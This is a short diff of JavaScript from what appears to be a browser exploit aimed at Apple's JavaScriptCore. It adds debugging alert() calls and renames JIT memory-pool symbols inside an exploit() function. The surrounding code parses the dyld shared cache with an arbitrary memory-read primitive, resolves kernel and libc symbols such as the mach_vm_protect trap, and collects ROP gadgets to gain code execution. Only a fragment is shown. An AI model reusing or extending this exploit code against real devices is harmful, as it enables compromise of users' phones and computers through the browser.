@@ -55,6 +55,7 @@ function off2addr(segs, off)
         {
             var start = segs[i].fileoff;
             var end   = Add(start, segs[i].size);
+            alert("start" + start + "end" + end + "off" + off)
             if
             (
                 (start.hi() < off.hi() || (start.hi() == off.hi() && start.lo() <= off.lo())) &&
@@ -586,8 +587,8 @@ function exploit(){
             "/usr/lib/system/libsystem_kernel.dylib":                               ["_mach_task_self_", "__kernelrpc_mach_vm_protect_trap"],
             "/usr/lib/system/libsystem_c.dylib":                                    ["_usleep"],
             "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore":   [
-                "__ZN3JSC32startOfFixedExecutableMemoryPoolE",
-                "__ZN3JSC30endOfFixedExecutableMemoryPoolE",
+                "__ZN3JSC32taggedstartOfFixedExecutableMemoryPoolE",
+                "__ZN3JSC30taggedendOfFixedExecutableMemoryPoolE",
             ],
         };
 
@@ -638,12 +639,14 @@ function exploit(){
                 "/usr/lib/libc++.1.dylib",  // ldrx8, regloader, movx4, stackloader
             ];
         }
-        //print('lookin through cache');
+        alert('lookin through cache');
 
         var syms = {};
         var gadgets = {};
         var imgs  = Add(hdr, memory.u32(Add(hdr, 0x18)));
+        alert("dyld cache images@" + imgs);
         var nimgs = memory.u32(Add(hdr, 0x1c));
+        alert("number of cache libs=" + nimgs);
         for(var i = 0; i < nimgs; ++i)
         {
             var straddr = off2addr(segs, memory.u32(Add(imgs, i * 0x20 + 0x18)));
